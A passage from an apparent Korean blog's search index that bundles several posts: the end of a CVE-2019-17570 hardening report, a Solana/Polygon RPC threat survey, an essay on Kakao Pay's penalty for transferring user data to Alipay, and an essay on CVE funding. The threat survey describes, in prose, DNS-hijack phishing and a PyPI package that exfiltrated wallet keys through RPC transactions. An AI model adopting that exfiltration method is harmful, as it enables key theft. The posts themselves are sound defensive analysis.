spf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); SAXParsers.setSAXParserFactory(spf); 6. 결론 및 권장사항 배포판 보안 패치 사용 evolvedbinary 포크 버전 사용 장기적으로는 gRPC, JAX-WS, SOAP 등으로 마이그레이션 고려 이 글은 CVE-2019-17570에 대한 실질적 보안 대응을 위한 분석 보고서입니다. 모든 코드와 패치 정보는 실무 환경에서도 직접 활용할 수 있도록 구성되었습니다.\n","permalink":"http://localhost:1313/ko/post/2025-04-24-cve-2019-17570-apache-xmlrpc/","summary":"Apache XML-RPC 라이브러리의 역직렬화 취약점 CVE-2019-17570에 대한 상세 분석과 패치 방법 및 안전한 구현 방법을 제시합니다.","title":"CVE-2019-17570 Apache XML-RPC 취약점 분석 보고서"},{"content":"Solana 및 Polygon RPC의 보안 위협 조사 보고서 서론 Solana와 Polygon의 RPC(Remote Procedure Call) 시스템은 블록체인 네트워크와 상호작용하는 핵심 인터페이스로, 각각 Rust와 Go 언어를 기반으로 구현됩니다. 본 보고서는 2025년 4월 21일 기준으로, Solana와 Polygon RPC의 보안 위협을 조사하고, Go와 Rust 언어 및 JSON-RPC 라이브러리 자체의 문제로 발생한 이슈를 분석합니다. 또한, Python 기반 클라이언트 노드의 직렬화/역직렬화 과정과 대표적인 RPC 클라이언트 애플리케이션(웹 애플리케이션, 디앱 백엔드, 데이터 분석 도구, 트랜잭션 서비스)을 포함하여 블록체인 생태계의 보안을 종합적으로 검토합니다. 이는 Web3 인프라의 안정성과 보안을 강화하기 위한 기초 자료로 활용될 수 있습니다.\n배경: Solana와 Polygon RPC의 언어 및 구조 Solana RPC 주요 언어: Rust (프로그램 및 노드), JavaScript/TypeScript (클라이언트) 구조: JSON-RPC 2.0, WebSocket 지원, 데이터와 코드 분리, 병렬 처리 및 비동기 이벤트 루프 특징: 초당 65,000 TPS, 초저렴한 수수료, 고성능 클러스터 기반 주요 제공자: QuickNode, Alchemy, Helius 테스트 환경: Devnet, Testnet Polygon RPC 주요 언어: Go (노드), Solidity (스마트 컨트랙트), JavaScript/TypeScript (클라이언트) 구조: JSON-RPC 2.0 (Ethereum 호환), EVM 기반, 레이어 2 아키텍처 (Bor 및 Heimdall 노드) 특징: 초당 ~7,000 TPS, Ethereum보다 저렴한 수수료, Ethereum 메인넷과의 체크포인트 주요 제공자: Ankr, dRPC, Alchemy, Infura 테스트 환경: Amoy Testnet RPC 클라이언트 애플리케이션 목록 Solana와 Polygon RPC에 접근하는 클라이언트는 주로 서버 노드(예: 디앱 백엔드)로 동작하며, Python, JavaScript, Go 등 다양한 언어로 구현됩니다. 아래는 대표적인 애플리케이션 유형과 사례입니다.\n웹 애플리케이션 설명: 사용자 인터페이스를 제공하며, 브라우저에서 RPC를 통해 블록체인과 상호작용. 대표 사례: MetaMask: 이더리움 호환 지갑으로 Polygon RPC를 통해 트랜잭션 전송 및 계정 관리. Phantom: Solana 전용 지갑으로 Solana RPC를 통해 계정 조회 및 디앱 연결. OpenSea: Polygon과 Solana를 지원하는 NFT 마켓플레이스로, RPC를 통해 NFT 데이터 조회 및 거래. Uniswap: Polygon에서 실행되는 DEX로, RPC를 통해 토큰 스왑 및 유동성 풀 데이터 제공. 디앱(DApp) 백엔드 설명: 디앱의 서버 측 로직을 처리하며, RPC를 통해 트랜잭션 생성, 스마트 컨트랙트 호출, 데이터 조회 수행. 대표 사례: Aave: Polygon에서 실행되는 DeFi 프로토콜로, RPC를 통해 대출 및 예금 트랜잭션 처리. Serum: Solana 기반 DEX로, RPC를 통해 주문서(order book) 관리 및 트랜잭션 실행. QuickSwap: Polygon의 AMM 기반 DEX로, RPC를 통해 스왑 및 유동성 제공. Raydium: Solana의 AMM 및 유동성 프로토콜로, RPC를 통해 풀 데이터 조회 및 트랜잭션. 블록체인 데이터 분석 도구 설명: 블록체인 데이터를 수집, 분석, 시각화하며, RPC를 통해 블록, 트랜잭션, 이벤트 로그 조회. 대표 사례: Dune Analytics: Polygon 및 Solana 데이터를 분석하여 대시보드 제공, RPC로 데이터 수집. The Graph: Polygon과 Solana의 서브그래프를 통해 인덱싱된 데이터 제공, RPC로 원시 데이터 조회. Nansen: 온체인 데이터 분석 플랫폼으로, RPC를 통해 계정 활동 및 트랜잭션 추적. Solana Explorer: Solana 블록체인 탐색기로, RPC를 통해 블록 및 트랜잭션 데이터 표시. 트랜잭션 생성/전송 서비스 설명: 트랜잭션을 생성하고 블록체인에 전송하는 서비스로, 자동화된 트랜잭션 처리에 사용. 대표 사례: Alchemy Transfer: RPC를 통해 대량 트랜잭션 전송 및 모니터링 (Polygon, Solana 지원). Infura Transactions (ITX): Polygon에서 트랜잭션 전송 및 가스 최적화 서비스. Fireblocks: 기업용 자산 관리 플랫폼으로, RPC를 통해 트랜잭션 생성 및 서명 (Polygon, Solana 지원). Helius: Solana 전용 트랜잭션 서비스로, RPC를 통해 고속 트랜잭션 처리 및 웹훅 제공. Python 기반 RPC 클라이언트 노드 Python은 직관적인 문법과 풍부한 라이브러리로 Solana와 Polygon RPC 클라이언트에서 널리 사용됩니다.\nSolana Python 클라이언트 라이브러리: solana-py 사용 사례: 잔액 조회, 트랜잭션 생성, 프로그램 호출, 데이터 분석. 예제 코드: from solana.rpc.api import Client from solana.publickey import PublicKey client = Client(\u0026#34;https://api.devnet.solana.com\u0026#34;) public_key = PublicKey(\u0026#34;83astBRguLMdt2h5U1Tpdq5tjFoJ6noeGwaY3mDLVcri\u0026#34;) balance = client.get_balance(public_key) print(f\u0026#34;Balance: {balance[\u0026#39;result\u0026#39;][\u0026#39;value\u0026#39;]} lamports\u0026#34;) Polygon Python 클라이언트 라이브러리: web3.py 사용 사례: 토큰 전송, 스마트 컨트랙트 호출, 이벤트 로그 수집. 예제 코드: from web3 import Web3 w3 = Web3(Web3.HTTPProvider(\u0026#34;https://rpc-amoy.polygon.technology\u0026#34;)) address = \u0026#34;0xYourAddressHere\u0026#34; balance = w3.eth.get_balance(address) print(f\u0026#34;Balance: {w3.from_wei(balance, \u0026#39;ether\u0026#39;)} MATIC\u0026#34;) 직렬화(Serialization)와 역직렬화(Deserialization) Solana: 직렬화: Borsh (바이너리), JSON (JSON-RPC). 역직렬화: JSON 응답을 파싱 후 Borsh로 계정 데이터, 트랜잭션 변환. 라이브러리: solana-py, borsh. Polygon: 직렬화: RLP, ABI, JSON (JSON-RPC). 역직렬화: JSON 응답을 파싱 후 ABI로 스마트 컨트랙트 데이터 변환. 라이브러리: web3.py, rlp. 일반적인 RPC 보안 위협 블록체인 RPC 시스템은 다음과 같은 공통적인 보안 위협에 직면합니다:\nDoS(서비스 거부) 공격 및 자원 고갈: 높은 트래픽으로 노드 응답 불가. 잘못된 설정: 민감한 엔드포인트 노출로 데이터 유출 또는 무단 접근. 무단 접근: 손상된 RPC 제공자를 통한 데이터/자산 접근. 스마트 컨트랙트 취약점: RPC를 통한 취약점 악용. 중앙화 위험: 제3자 RPC 제공자 의존으로 인한 단일 실패 지점. 공급망 공격: Python 클라이언트에서 악성 PyPI 패키지 설치. Solana RPC의 보안 위협 Solana의 RPC는 Rust 기반의 고성능 설계로, 다음과 같은 보안 위협이 존재합니다:\nDoS 공격 및 자원 고갈: 병렬 처리 설계는 높은 트래픽 공격에 취약. 무료 RPC 서비스 악용으로 자발적 DoS 가능. 출처: Protecting Web3 infrastructure - Security insights from RPC providers at Breakpoint 2023 | Solana Compass 잘못된 설정: 민감한 엔드포인트 노출로 데이터 조회 또는 악성 트랜잭션 전송. 출처: Blockchain Node Security: Safeguarding RPC and Validator Nodes - comparenodes 논리 오류 및 경쟁 조건: Rust의 메모리 안전성에도 불구하고 논리 오류나 경쟁 조건으로 서비스 중단. 메모리 증폭 공격으로 자원 고갈. 출처: Blockchain RPC Vulnerabilities: Why Memory-Safe Blockchain RPC Nodes are Not Panic-Free | CertiK Skyfall 중앙화 위험: 제3자 RPC 제공자 의존으로 단일 실패 지점, DeFi 생태계에 시스템적 위험. 출처: Top Solana RPC Providers Compared [2025] 사례: 2024년 8월 Solana는 중요한 취약점을 패치하여 네트워크 보안 강화 (Solana Patches Critical Vulnerabilities and Secures the Blockchain).\nPolygon RPC의 보안 위협 Polygon의 RPC는 Go 기반의 노드와 Solidity 스마트 컨트랙트를 포함하며, 다음과 같은 보안 위협이 있습니다:\nDNS 하이재킹 및 무단 접근: 2022년 7월 Ankr 공공 RPC 게이트웨이 손상으로 사용자 피싱 사이트 리디렉션. PyPI 패키지 \u0026ldquo;set-utils\u0026quot;를 통한 이더리움 개인 키 탈취. 출처: Breaking: Polygon Under Attack as Ankr\u0026rsquo;s Public RPC Gateway is Compromised - The Layer, This Malicious PyPI Package Stole Ethereum Private Keys via Polygon RPC Transactions 잘못된 설정: 민감한 데이터 노출 또는 악성 트랜잭션 허용. 출처: Security Tips for RPC Endpoint Users | Protect Blockchain Data Go 기반 취약점: 네트워크 요청 처리 취약점, 제3자 라이브러리 취약점. 출처: How to secure Ethereum JSON RPC from Vulnerabilities 중앙화 위험: 제3자 RPC 제공자 의존으로 단일 실패 지점. 출처: Security operations - Polygon Knowledge Layer 스마트 컨트랙트 취약점: Solidity 기반 컨트랙트 취약점 RPC를 통해 악용. 출처: Polygon Technology - Bug Bounty Program | HackerOne 사례: Polygon은 버그 바운티 프로그램과 강력한 인증, 로그 모니터링으로 보안 조치 강화 (Security operations - Polygon Knowledge Layer).\n2022년 Ankr RPC 손상 및 PyPI 패키지 공격 상세 분석 2022년 Ankr RPC 손상 (DNS 하이재킹) 발생 시기: 2022년 7월 1일 공격 유형: DNS 하이재킹, 피싱 영향받은 대상: Polygon (polygon-rpc.com), Fantom (rpc.ftm.tools) 사용자 공격 방법: 공격자가 Ankr의 DNS 제공업체(Gandi)를 속여 도메인 등록 계정 이메일을 변경. 손상된 RPC 게이트웨이가 피싱 사이트(polygonapp[.]net)로 리디렉션, 시드 프레이즈 입력 유도. 영향: 서비스 중단 (Ambire Wallet, QuickSwap 등 디앱). 잠재적 자산 도난, Ankr는 자금 손실 없다고 주장. Web3 인프라 신뢰도 하락. 대응: DNS 계정 복구 (6시간 내). 대체 RPC 제공 (https://rpc.ankr.com/polygon, https://rpc.ankr.com/fantom). Polygon의 자체 RPC 및 분산형 대안 연구. 원인: 중앙화된 DNS, Gandi의 취약한 인증 절차, 사회공학. 출처: Breaking: Polygon Under Attack as Ankr\u0026rsquo;s Public RPC Gateway is Compromised - The Layer PyPI 패키지 공격 (set-utils) 발생 시기: 2025년 1월 29일 ~ 2025년 3월 초 공격 유형: 공급망 공격, 개인 키 도난 영향받은 대상: 이더리움 지갑 개발자, Python 기반 블록체인 애플리케이션 공격 방법: 악성 PyPI 패키지 set-utils가 python-utils, utils와 유사한 이름으로 배포 (1,000회 이상 다운로드). 지갑 생성 함수(from_key, from_mnemonic) 수정, 개인 키를 암호화 후 Polygon RPC(rpc-amoy.polygon.technology)를 통해 유출. 영향: 생성된 지갑 영구 손상. 블록체인 트랜잭션 유출로 탐지 어려움. PyPI 및 Web3 개발자 신뢰 손상. 대응: Socket Research Team의 보고로 패키지 삭제. PyPI의 공급망 보안 강화 권고. RPC 오용 방지를 위한 모니터링 필요. 원인: PyPI의 오픈소스 특성, RPC 오용, 부족한 패키지 검증. 출처: This Malicious PyPI Package Stole Ethereum Private Keys via Polygon RPC Transactions Go/Rust 언어 및 JSON-RPC 라이브러리 관련 이슈 Go와 Rust 언어 또는 JSON-RPC 라이브러리의 문제로 RPC에서 이슈가 발생한 사례는 다음과 같습니다.\nRust 기반 RPC 이슈 취약점: 논리 오류, 자원 고갈, DoS 공격 가능성. 사례: 2024년 3월 Aptos, StarCoin, Sui의 Rust 기반 RPC 노드 취약점 (서비스 중단, 메모리 증폭 공격). 원인: 경쟁 조건, 무한 루프 등 논리적 설계 오류. 출처: Blockchain RPC Vulnerabilities: Why Memory-Safe Blockchain RPC Nodes are Not Panic-Free | CertiK Skyfall Go 기반 RPC 이슈 취약점: 자원 소진 공격, 인프라 설정 문제. 사례: 2016년 Ethereum go-ethereum의 RPC 인터페이스 자원 소진 공격 가능성. 2022년 Polygon Ankr RPC 손상 (DNS 하이잭, 언어 자체 문제 아님). 원인: 네트워크 요청 처리 취약점, 잘못된 설정. 출처: RPC vulnerable? · Issue #3298 · ethereum/go-ethereum JSON-RPC 라이브러리 취약점 취약점: JSON 파싱 오류, 인증 부족, CSRF. 사례: Monero JSON 파서의 스택 오버플로우로 임의 코드 실행 가능성. CryptoNote 지갑의 인증 부족으로 무단 접근 및 CSRF. 원인: 파싱 로직 또는 인증 설정 부족. 출처: HackProof | Web3 Bug Bounty platform for Crypto Projects, Unauthenticated JSON-RPC API allows takeover of CryptoNote RPC wallets · Issue #172 · cryptonotefoundation/cryptonote Python 클라이언트의 보안 고려사항 Python 기반 RPC 클라이언트는 직렬화/역직렬화 과정에서 다음과 같은 보안 위협에 노출됩니다:\nPyPI 공급망 공격: set-utils 패키지로 개인 키 유출. JSON 파싱 취약점: 역직렬화 시 스택 오버플로우. RPC 엔드포인트 손상: Ankr 사건처럼 손상된 엔드포인트로 악성 데이터 수신. 데이터 유출: 직렬화된 데이터가 MITM 공격으로 노출. 대응:\n패키지 검증, Trusted Publishers 사용. 신뢰할 수 있는 RPC 제공자(Alchemy, QuickNode) 및 HTTPS 사용. 입력 검증, 환경 격리(Docker), 최신 라이브러리 유지. 비교 표 특징 Solana RPC Polygon RPC 주요 언어 Rust (프로그램 및 노드), JavaScript (클라이언트) Go (노드), Solidity (스마트 컨트랙트), JavaScript (클라이언트) 구조적 특징 병렬 처리, 저지연 설계, JSON-RPC 2.0 EVM 호환, 레이어 2, Ethereum과의 상호작용, JSON-RPC 주요 보안 위협 DoS 공격, 논리 오류, 경쟁 조건, 자원 고갈, 중앙화 위험 DNS 하이재킹, 무단 접근, Go 기반 취약점, 중앙화 위험, 스마트 컨트랙트 취약점 언어 관련 이슈 논리 오류, 자원 고갈 (Aptos, Sui 사례) 자원 소진 공격 (go-ethereum), 인프라 설정 문제 (Ankr 사건) JSON-RPC 이슈 파싱 오류, 인증 부족 가능성 파싱 오류, 인증 부족, CSRF (Monero, CryptoNote 사례) 사례 2024년 취약점 패치, 자원 고갈 공격 2022년 Ankr RPC 손상, PyPI 패키지 공격 결론 및 권장 사항 Solana와 Polygon의 RPC 시스템은 Rust와 Go 언어를 기반으로 고성능과 안정성을 제공하지만, DoS 공격, DNS 하이재킹, 공급망 공격 등 다양한 보안 위협에 노출됩니다. Python 기반 클라이언트는 직렬화/역직렬화 과정에서 PyPI 패키지 공격과 같은 위협에 취약하며, 대표적인 애플리케이션(MetaMask, Aave, Dune Analytics 등)은 RPC의 안정성에 크게 의존합니다. 언어 및 JSON-RPC 라이브러리 자체의 문제는 논리 오류, 자원 관리, 파싱 취약점으로 나타나지만, 이는 구현과 설정에 더 크게 좌우됩니다.\n권장 사항: 신뢰할 수 있는 RPC 제공자 사용: Alchemy, QuickNode, Ankr 등 검증된 제공자 활용. 자체 RPC 노드 운영: 중앙화 위험을 줄이기 위해 자체 노드 설정. 강력한 인증 및 보안 설정: API 키, IP 화이트리스트, HTTPS, 2FA 적용. 패키지 및 코드 검증: PyPI 패키지 설치 전 코드 검토, Trusted Publishers 사용. 정기 보안 감사: 코드 검토, 취약점 스캔, 최신 소프트웨어 유지. 사용자 교육: 피싱, 시드 프레이즈 보호, 공급망 공격 인식 제고. 이러한 조치를 통해 Solana와 Polygon RPC 시스템 및 클라이언트 애플리케이션의 보안을 강화할 수 있습니다.\n전체 인용 링크 Blockchain RPC Vulnerabilities: Why Memory-Safe Blockchain RPC Nodes are Not Panic-Free | CertiK Skyfall RPC vulnerable? · Issue #3298 · ethereum/go-ethereum Breaking: Polygon Under Attack as Ankr\u0026rsquo;s Public RPC Gateway is Compromised - The Layer This Malicious PyPI Package Stole Ethereum Private Keys via Polygon RPC Transactions Protecting Web3 infrastructure - Security insights from RPC providers at Breakpoint 2023 | Solana Compass Solana Patches Critical Vulnerabilities and Secures the Blockchain Blockchain Node Security: Safeguarding RPC and Validator Nodes - comparenodes Security Tips for RPC Endpoint Users | Protect Blockchain Data Security operations - Polygon Knowledge Layer Polygon Technology - Bug Bounty Program | HackerOne HackProof | Web3 Bug Bounty platform for Crypto Projects Unauthenticated JSON-RPC API allows takeover of CryptoNote RPC wallets · Issue #172 · cryptonotefoundation/cryptonote How to secure Ethereum JSON RPC from Vulnerabilities Learn how the Solana blockchain works | Solana Top Solana RPC Providers Compared [2025] Breaking: Polygon, Major Blockchains Hit With Network Attack Blockchain Security: Common Issues \u0026amp; Vulnerabilities | NordLayer RPC endpoints | Polygon PoS | Polygon Technology | Documentation ","permalink":"http://localhost:1313/ko/post/test/","summary":"test","title":"test"},{"content":" 내 정보, 고양이 손에 맡겼나요? 2025년 카카오페이 사건과 개인정보 보호 체계의 구조적 한계 서론 2025년 1월, 한국 개인정보보호위원회(PIPC)는 카카오페이에 60억 원(약 580만 달러)의 과징금을 부과했다(MLex, 2025). 약 4,000만 명의 사용자 데이터가 명시적 동의 없이 중국 알리페이로 전송되어 신용 유사 점수(NSF, Non-Financial Score) 모델 개발에 활용된 사건이다. NSF는 보험료, 대출 승인, 취업 기회 등 개인의 삶에 중대한 영향을 미칠 수 있는 비금융 신용 평가 지표다.\n이 사건은 단순한 유출을 넘어, 형식적 동의와 기업 자율 규제의 구조적 한계를 드러냈다. 우리는 고양이에게 생선을 맡기지 않지만, 왜 기업에게는 우리의 데이터를 덥석 맡기는 걸까? 본 보고서는 2025년 카카오페이 사건을 법적·기술적·사회적 관점에서 분석하고, AI 기반 DPIA 검증 툴과 시민 감시를 통한 데이터 민주주의를 제안한다.\n1. 카카오페이 사건: 세부사항과 법적 위반 사건 개요 발생 시점: 2018년 4월~7월, 세 차례에 걸쳐 데이터 전송(Businesskorea, 2025). 전송된 데이터: 사용자명, 전화번호, 이메일 주소, 계좌 잔액 등 24개 항목, 총 54.2억 건의 민감한 정보. 활용 목적: 알리페이는 데이터를 NSF 점수 모델에 활용. NSF는 신용 평가로, 보험료 인상, 대출 거절, 취업 불이익 등에 영향을 미칠 수 있음. 제재 조치: 2025년 1월, PIPC는 카카오페이에 60억 원, 애플에 24.5억 원의 과징금 부과. 알리페이는 NSF 모델 폐기 명령. 법적 위반 카카오페이는 **개인정보 보호법(PIPA)**의 다음 조항을 위반했다:\nPIPA 제20조 (제3자 제공 동의 요건): 개인정보를 제3자에게 제공하려면 명시적이고 구체적인 동의를 받아야 함. 동의서에 NSF 활용 목적 미고지. PIPA 제28조 (국외 이전 동의): 개인정보를 국외로 이전할 경우, 데이터 주체의 동의와 추가 보호 조치가 필요. 카카오페이는 이를 준수하지 않음. “사용자는 동의했지만, 그 ‘동의’가 무엇에 대한 것인지 알지 못했다.”\n— Korea Bizwire, 2025\n2. 개인정보 보호법(PIPA)의 구조적 한계 주요 조항 요약 제20조: 제3자 제공 시 명시적 동의 필요. 제28조: 국외 이전 시 별도 동의 및 보호 조치 요구. 제33조: 고위험 정보 처리 시 DPIA 필수. 최근 개정 2023년: PIPA 개정으로 ‘동일 행위-동일 규제’ 원칙 도입. 온라인 서비스 제공자(OSPs)에 대한 특별 규정이 폐지됨. 2023년 9월 15일부터 시행(Data Protection Laws of the World). 2024년 시행령: 자동화된 의사결정 설명 요구권, 개인정보 보호 책임자(CPO) 자격 요건 강화, 데이터 침해 보험 의무화. 자율 규제의 문제 DPIA 비공개성: DPIA는 기업이 자체적으로 작성하며, 외부 공개 의무가 없음. 이는 투명성 부족과 책임 회피로 이어짐. 감시 부족: PIPC의 감독은 사후 제재 중심으로, 사전 예방 효과 미흡. 한국의 개인정보 보호법(PIPA)에서 기업이 스스로 DPIA(데이터 보호 영향 평가)를 작성하는 구조는 고양이가 생선 창고를 지키는 것과 유사하다는 비판이 제기되고 있습니다. DLA Piper는 이와 관련해 DPIA 보고서가 외부에 공개되지 않아 투명성이 부족하다고 지적했습니다 — DLA Piper – South Korea Data Protection\n3. AI 기반 DPIA 검증: 기술적 기회 AI는 DPIA(Data Protection Impact Assessment, 데이터 보호 영향 평가)의 객관성과 투명성을 높이는 데 기여할 수 있습니다. AI 기반 DPIA 검증 도구는 데이터 흐름을 분석하고, 잠재적 위험을 식별하며, 자동으로 보고서를 생성할 수 있습니다. 유럽에서는 GDPR 준수를 평가하기 위해 \u0026ldquo;Privacy-Aware AI\u0026rdquo; 프레임워크가 활용되고 있으며, 한국에서도 유사한 방식의 도입이 가능할 것입니다 (Fieldfisher, 2023).\nAI 기반 DPIA 도구의 예시 여러 플랫폼에서 DPIA 프로세스를 지원하기 위해 AI를 점차 통합하고 있습니다:\nKetch\nAI 기반 추천 기능을 통해 Privacy Impact Assessments(PIAs)를 자동화하고, DPIA의 정확도 향상과 위험 식별에 도움을 줍니다.\nSecuriti\n글로벌 DPIA 자동화 기능을 제공하며, 명시적으로 AI 기능을 강조하지는 않지만 AI 기반 평가가 내포되어 있습니다.\nClarip\n“Hybrid AI Rocks!”라는 문구로 AI의 활용 가능성을 시사하며 DPIA 자동화 소프트웨어를 홍보합니다. 그러나 구체적인 AI 기능은 상세히 설명되어 있지 않습니다.\n이러한 플랫폼은 주로 개인정보 위험 평가를 자동화하고, DPIA 프로세스를 지원하여 간과된 취약점을 감지하고 포괄적 검토를 가능하게 합니다. 그러나 대부분은 독립적인 DPIA 검증 엔진으로 설계되지 않았으며, AI 구성 요소의 투명성 수준도 제각각입니다.\n학계 및 산업계의 연구 AI 기반 DPIA 검증을 직접 다루는 연구는 아직 많지 않지만, AI 시스템에 대한 DPIA 수행 및 AI 통합 방법에 관한 유용한 자료들이 있습니다:\nFieldfisher의 가이드\nAI 맥락에서 DPIA를 수행할 때의 모범 사례를 제시하며, AI 기술이 개인정보 보호 준수를 어떻게 지원할 수 있는지 설명합니다.\nMansi의 블로그\n자동 분류, 예측 기반 위험 분석, 모니터링, 자동 문서화 등 AI를 활용한 DPIA 수행 방법을 탐구합니다.\n\u0026ldquo;미국 프라이버시 규제 하의 AI 프로젝트용 DPIA 모델 제안\u0026rdquo; (ResearchGate, 2025)\nAI 프로젝트에 특화된 DPIA 프레임워크를 제안하며, 구조화된 AI 통합 평가 모델의 필요성을 강조합니다.\n이러한 자료들은 법적 준수와 기술적 정밀성을 결합한 AI 기반 DPIA 도구의 발전을 위한 기초를 형성하고 있습니다.\n과제와 전망 현재의 AI 기반 DPIA 검증 도구는 제한적인 수준이며, 대부분 검증 도구라기보다는 준수 지원 도구로 작동합니다. 그럼에도 불구하고 이들은 DPIA 프로세스의 효율성, 포괄성, 객관성을 향상시킬 수 있는 큰 가능성을 지니고 있습니다. 연구가 지속되고 규제 수요가 증가함에 따라, 보다 정교하고 투명한 AI 기반 DPIA 검증 도구들이 가까운 미래에 등장할 것으로 기대됩니다.\n4. 시민 감시의 실효성과 필요성 시민 감시는 개인정보 보호의 실효성을 높이는 데 필수적이다. 2022년 Future of Privacy Forum(FPF) 보고서에서는 동의 중심 데이터 보호 체계의 한계를 지적하며, 위험 기반 접근법과 시민 참여의 필요성을 강조했다(FPF, 2022). 또한, ACM Digital Library에서는 시민 중심 데이터 거버넌스에 대한 연구가 진행되고 있으며, 특히 스마트 시티에서의 시민 중심 접근이 강조되고 있다(DGOV, 2023).\n실제 사례로, 카카오페이 사건은 시민 단체의 신고로 경찰 조사가 시작되었으며, 이는 시민 감시의 중요성을 보여준다(MLex, 2024).\n5. 데이터 민주주의를 위한 제도적 제안 카카오페이 사건은 개인정보 보호의 구조적 취약성을 드러냈으며, AI 기술과 시민 감시를 결합한 제도적 개혁이 필요하다:\nAI 기반 DPIA 검증 도입\nPIPC 주도로 AI 툴을 활용해 DPIA 보고서의 객관성 검증. DPIA 외부 공개 의무화\nDPIA 요약본 공개 및 독립적 리뷰 위원회(전문가·시민 포함) 설립. 데이터 위치 확인 API 권리화\nPIPA 제18조(데이터 이동성 권리) 확장, 데이터 저장·이동 경로 추적 API 제공 의무화. 자동화된 의사결정 설명 의무 강화\nAI 기반 NSF 점수 등 의사결정 과정 설명 의무 명시, 불이행 시 제재 강화. 시민 참여 공적 감사단 제도화\n시민사회·학계·전문가 참여 감사단 법제화, 데이터 처리 관행 정기 점검. PIPA 개정 절차 민주화\n공청회, 시민 의견 청취 의무화, 소비자 단체 공식 참여 보장. 결론 2025년 카카오페이 사건은 형식적 동의와 자율 규제의 한계를 보여준다. PIPA는 강력한 틀이지만, 감시와 참여 없이는 공허하다. AI 기반 DPIA 검증 툴은 투명성과 객관성을 높이는 기술적 해결책이며, 시민 감시는 이를 뒷받침하는 사회적 동력이다. 이제 기업이 독점하던 데이터 관리의 문을 열고, 시민과 전문가의 협력을 통해 데이터 민주주의를 실현해야 할 때다.\n참고 자료 MLex, 2025 Businesskorea, 2025 Data Protection Laws of the World Fieldfisher, 2023 FPF, 2022 DGOV, 2023 MLex, 2024 ","permalink":"http://localhost:1313/ko/post/2025-04-21-expert-personal-data-report/","summary":"2025년 카카오페이 사건은 형식적 동의와 자율 규제의 한계를 드러냈습니다. AI 기반 DPIA 검증과 시민 감시를 통해 데이터 민주주의를 실현해야 합니다.","title":"내 정보, 고양이 손에 맡겼나요?"},{"content":"\n\u0026ldquo;공짜 점심은 없다.\u0026rdquo;\n하지만 수십 년 동안, 보안은 공짜처럼 느껴졌습니다.\nCVE: 단순한 번호가 아니라, 보안의 좌표계 CVE(Common Vulnerabilities and Exposures)는 흔히 단순한 취약점 번호로 오해되지만, 실제로는 전 세계 보안 툴, 벤더, 리포트가 동일한 취약점을 참조할 수 있게 해주는 기준점입니다.\nAdam Shostack의 설명처럼, 이는 정보보안의 ISBN과도 같습니다.\n“CVE의 가치는 단순한 번호가 아니라, 도구, 데이터베이스, 벤더 패치를 안정적으로 교차 참조할 수 있도록 해주는 기능에 있습니다.”\n우리는 이 시스템을 공짜로 써왔다 CVE는 미국 정부 예산으로 운영되는 비영리기관 MITRE에 의해 유지되어 왔습니다.\n하지만 이 시스템은 사실상 전 세계의 보안 인프라로 사용되며도 불구하고,\n대다수 연구자들은 무보수로 기여했고 국제적 재정 분담은 존재하지 않았으며 기업과 커뮤니티는 이를 공짜로 활용해 왔습니다. 결과적으로, CVE는 글로벌 공공재로서 작동하면서도 단일 국가의 예산과 무급 노동에 의존한 구조였습니다.\n가까스로 막은 붕괴, 그러나 구조는 여전히 불안정 2025년 4월, MITRE의 CVE 운영 계약이 종료될 위기를 맞았고, CISA가 개입해 11개월짜리 긴급 연장을 승인했습니다.\nReuters, BleepingComputer, The Register는 이 사태를 \u0026ldquo;위기는 피했지만, 구조적 문제는 여전하다\u0026quot;고 분석했습니다.\n이는 단기적인 연명일 뿐, 단일 국가가 글로벌 시스템을 유지한다는 구조 자체가 이미 한계에 도달했음을 보여줍니다.\n보안세? 아직 없지만, 논의는 시작됐다 다음과 같은 상상을 해볼 수 있습니다:\n사이버 위험이 높은 기업들이 매출의 일부를 보안 기금으로 납부하고,\n그 자금으로 CVE 같은 공공 인프라, NGO, 버그 바운티 프로그램, 연구자 보상 체계를 운영하는 구조.\n이 아이디어는 이 글에서 소개되었으며,\nBankInfoSecurity는 미국 백악관 자문위원회가 사이버보안 세액공제 인센티브를 권고하고 있으며, TechTarget는 사이버보안을 \u0026lsquo;기업이 부담해야 할 필수 비용\u0026rsquo;으로 인식하는 흐름을 설명합니다. 이는 다음과 같은 인식을 반영합니다:\n보안 인프라에 무임승차하는 구조는 지속 불가능 공공 보안 시스템에는 공동 책임이 필요함 기여자는 단순한 명예가 아닌 정당한 보상을 받아야 함 지속 가능한 구조로 전환: 글로벌 협력의 조짐 [CVE는 더 이상 국가의 시스템이 아니라, 전 세계 인터넷의 기반 인프라]라는 인식이 확산되고 있습니다. 이를 반영하여 Common Good Cyber는 다음과 같은 구조를 제안합니다:\n공동 기금 조직(Joint Funding Orgs) — 전염병 대응 구조와 유사한 다자 자금 운영 연합 모금(Federated Fundraising) — 유나이티드웨이처럼 효율적 자원 분배 비즈니스 가치 분석 — 각 조직의 영향력을 수치화하여 기금 조성 비영리 가속기 허브 — 자원 집중 및 펀딩 기술 지원 이러한 구조는 2025년 RSA 컨퍼런스에서 발표되었으며, CSIS도 유사한 공공-민간 협력 모델의 필요성을 제시하고 있습니다.\n공짜는 아니었다. 이제는 지불할 때다 CVE는 결코 공짜가 아니었습니다.\n단지 우리가 누군가의 노동과 세금, 헌신에 기대어 살아왔을 뿐입니다.\n이제 우리는 그 공공재가 사라지기 전에,\n국제 공동 펀딩, 산업계의 책임 분담, 기여자에 대한 정당한 보상, 민관 협력 체계를 함께 설계해야 합니다. 보안은 공짜처럼 느껴졌지만,\n그 값을 누군가는 항상 지불하고 있었습니다.\n📌 요약 CVE는 사이버보안의 핵심 공공 인프라입니다. 전 세계가 사용하지만, 미국만이 자금을 부담해 왔습니다. 2025년, 11개월 간의 유예는 구조적 문제를 해결하지 못합니다. 지속 가능성을 위한 글로벌 협력과 새로운 자금 모델이 필요합니다. 공짜 점심은 끝났습니다.\n이제는 누가 계산서를 들고 있었는지 돌아볼 시간입니다.\n","permalink":"http://localhost:1313/ko/post/2025-04-17-theres-no-such-thing-as-a-free-lunch-but-security-was-free/","summary":"전 세계 보안 커뮤니티는 수십 년 동안 CVE 시스템에 의존해왔지만, 그 대가를 지불한 적은 거의 없습니다. 이제 이 공공 보안 인프라의 지속 가능성을 위해 누가 비용을 부담해야 할지 물어야 할 때입니다.","title":"공짜 점심은 없지만, 보안에는 공짜가 있었다"},{"content":"📂 [기밀 문서] 유출본\n《AI 시대, 직원은 고립되고 조직은 번창한다》 ― 악덕 경영 매뉴얼 v1.0 1. 인간관계? 제거하라 사람들끼리 친해지면 무슨 일이 생기나?\n뒷담화 집단 퇴사 연대와 저항 